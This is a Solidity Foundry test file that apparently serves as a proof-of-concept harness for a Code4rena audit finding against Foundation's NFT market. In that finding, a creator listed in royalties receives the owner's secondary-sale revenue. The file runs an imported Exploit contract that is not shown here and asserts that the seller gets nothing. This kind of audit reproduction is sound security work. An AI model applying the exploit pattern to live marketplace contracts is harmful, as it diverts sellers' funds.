// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./42485-h-02-creators-can-steal-sale-revenue-from-owners-sales-code4.sol";

/* Foundation H-02 — seller-in-royalties flags isCreator, ownerRev=0 */
contract PoC_42485 is Test {
    function test_creator_steals_secondary_sale_revenue() public {
        Exploit e = new Exploit();
        e.run{value: e.PRICE()}();

        assertEq(address(e.seller()).balance, 0);
        // creator received price - secondary fee (5%) = 9.5 ETH
        assertEq(address(e.creator()).balance, (e.PRICE() * 9500) / 10000);
    }
}
